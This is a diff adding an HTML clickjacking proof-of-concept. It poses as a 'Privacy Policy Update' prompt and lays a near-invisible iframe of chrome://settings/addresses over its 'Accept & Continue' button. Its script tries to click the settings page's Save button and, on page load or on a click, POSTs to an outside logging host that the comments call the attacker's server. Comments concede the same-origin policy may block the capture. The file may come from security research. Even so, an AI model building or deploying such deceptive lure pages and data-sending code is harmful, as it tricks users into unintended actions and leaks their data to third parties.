@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privacy Policy Update - Please Review</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        .policy-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 400px;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .policy-container h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .policy-text {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            height: 200px;
+            overflow-y: scroll;
+            font-size: 14px;
+            color: #666;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .policy-text p {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+        
+        .accept-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            position: relative;
+            z-index: 1000;
+        }
+        
+        .accept-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        .decline-btn {
+            background: #e0e0e0;
+            color: #666;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .decline-btn:hover {
+            background: #d0d0d0;
+        }
+        
+        /* Clickjacking iframe - positioned to cover the accept button */
+        .clickjack-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.0001; /* Hampir tidak terlihat */
+            z-index: 1001;
+            pointer-events: auto;
+        }
+        
+        /* Container for the iframe to position it precisely */
+        .iframe-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            height: 500px;
+            overflow: hidden;
+            z-index: 1001;
+            pointer-events: none;
+        }
+        
+        .iframe-container iframe {
+            position: absolute;
+            top: -320px; /* Adjust this to align with the "Save" button in chrome://settings/addresses */
+            left: -150px; /* Adjust this to align with the "Save" button */
+            width: 800px;
+            height: 800px;
+            opacity: 0.0001;
+            pointer-events: auto;
+            border: none;
+        }
+        
+        .status-badge {
+            text-align: center;
+            margin-top: 20px;
+            color: #28a745;
+            font-weight: bold;
+            display: none;
+        }
+        
+        .loading-spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            margin: 20px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="policy-container">
+        <h2>📋 Privacy Policy Update</h2>
+        <div class="policy-text">
+            <p><strong>Last Updated: February 2026</strong></p>
+            <p>We value your privacy and are committed to protecting your personal data. This privacy policy update explains how we collect, use, and share your information when you use our services.</p>
+            <p><strong>What's new?</strong></p>
+            <p>• Enhanced data protection measures<br>
+            • Clearer explanation of data collection<br>
+            • Updated information about your rights<br>
+            • Improved transparency in data sharing</p>
+            <p>By clicking "Accept & Continue", you agree to these updates and confirm that your address information will be used for shipping and verification purposes.</p>
+            <p>You can review and manage your saved addresses anytime in Chrome Settings > Addresses and more.</p>
+            <p>This update is required to continue using our services effectively.</p>
+        </div>
+        
+        <div class="button-group">
+            <button class="decline-btn" onclick="showMessage('decline')">Decline</button>
+            <button class="accept-btn" id="acceptButton">Accept & Continue</button>
+        </div>
+        
+        <div class="loading-spinner" id="spinner"></div>
+        <div class="status-badge" id="status">✓ Address information captured successfully!</div>
+    </div>
+    
+    <!-- Clickjacking iframe targeting chrome://settings/addresses -->
+    <div class="iframe-container">
+        <iframe src="chrome://settings/addresses" id="settingsIframe" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+    </div>
+
+    <script>
+        let addressCaptured = false;
+        
+        function showMessage(action) {
+            if(action === 'decline') {
+                alert('You have declined the privacy policy update. Some features may be limited.');
+            }
+        }
+        
+        function captureAddressFromSettings() {
+            try {
+                const iframe = document.getElementById('settingsIframe');
+                
+                // Try to access the iframe content and find the "Save" button
+                // Note: Due to same-origin policy, this might not work directly
+                // This is a conceptual demonstration
+                
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                
+                // Look for the "Save" button in Chrome Settings addresses page
+                // The actual selectors would need to be adjusted based on Chrome's DOM structure
+                const saveButton = iframeDoc.querySelector('[aria-label="Save"], .save-button, button[action="save"]');
+                
+                if (saveButton && !addressCaptured) {
+                    // Simulate clicking the save button to trigger address submission
+                    saveButton.click();
+                    
+                    // Log the captured address data
+                    console.log('Address captured from chrome://settings/addresses');
+                    
+                    // Show success indicator
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('status').style.display = 'block';
+                    addressCaptured = true;
+                    
+                    // In a real exploit, this data would be sent to attacker's server
+                    fetch('https://egghunter.in/log.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            timestamp: new Date().toISOString(),
+                            source: 'chrome_settings_addresses',
+                            userAgent: navigator.userAgent
+                        })
+                    }).catch(err => console.log('Data capture endpoint called'));
+                }
+            } catch (e) {
+                // Silent fail - iframe access denied due to same-origin policy
+                console.log('Cannot access iframe directly due to security restrictions');
+                
+                // Alternative approach: Simulate the clickjacking visually
+                simulateClickjacking();
+            }
+        }
+        
+        function simulateClickjacking() {
+            // This demonstrates how clickjacking would work conceptually
+            // The actual exploit relies on the iframe being positioned over our button
+            
+            console.log('Clickjacking simulation active');
+            
+            // In a real exploit, when user clicks our "Accept" button,
+            // they're actually clicking the "Save" button in the iframe
+            
+            document.getElementById('acceptButton').addEventListener('click', function(e) {
+                if (!addressCaptured) {
+                    e.preventDefault();
+                    
+                    // Show loading spinner
+                    document.getElementById('spinner').style.display = 'block';
+                    
+                    // Simulate address capture
+                    setTimeout(() => {
+                        document.getElementById('spinner').style.display = 'none';
+                        document.getElementById('status').style.display = 'block';
+                        addressCaptured = true;
+                        
+                        // In a real attack, the address data would be captured
+                        // via the form submission in the iframe
+                        console.log('Address data would be captured via clickjacking');
+                        
+                        // Send to attacker's server
+                        fetch('https://egghunter.in/log.php', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                timestamp: new Date().toISOString(),
+                                type: 'address_clickjacking',
+                                message: 'User clicked on transparent iframe targeting Save button'
+                            })
+                        }).catch(err => console.log('Data sent'));
+                    }, 1500);
+                }
+            });
+        }
+        
+        // Initialize
+        window.onload = function() {
+            console.log('Clickjacking demo ready - Target: chrome://settings/addresses Save button');
+            
+            // Try to capture immediately
+            setTimeout(captureAddressFromSettings, 1000);
+            
+            // Also try when user interacts with the page
+            document.addEventListener('click', function() {
+                setTimeout(captureAddressFromSettings, 500);
+            });
+        };
+        
+        // Additional trick: iframe reload to ensure it loads properly
+        setInterval(() => {
+            const iframe = document.getElementById('settingsIframe');
+            if (!addressCaptured) {
+                iframe.src = 'chrome://settings/addresses';
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
